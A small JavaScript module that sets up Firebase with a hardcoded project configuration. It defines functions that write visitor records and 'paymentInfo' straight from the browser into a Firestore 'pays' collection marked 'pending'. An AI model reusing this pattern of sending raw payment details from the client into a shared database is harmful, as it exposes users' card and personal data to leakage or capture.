// firebase.js
import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { doc, getFirestore, setDoc } from "firebase/firestore";

// src/CartContext.js
const firebaseConfig = {
  apiKey: "AIzaSyBmILFib2Ut63p1xXPUjJbsLlHdaKsvlGs",
  authDomain: "zain2-ccd69.firebaseapp.com",
  projectId: "zain2-ccd69",
  storageBucket: "zain2-ccd69.firebasestorage.app",
  messagingSenderId: "333275867179",
  appId: "1:333275867179:web:ae2bf7bd2e9504921da26e",
  measurementId: "G-T2TQTKQ2TW"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);
export async function addData(data: any) {
  localStorage.setItem("visitor", data.id);
  try {
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(docRef, { ...data,createdDate:new Date().toISOString()},{ merge: true });

    console.log("Document written with ID: ", docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("Error adding document: ", e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: "pending" ,createdDate:new Date().toISOString()},
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};
export { db, database };
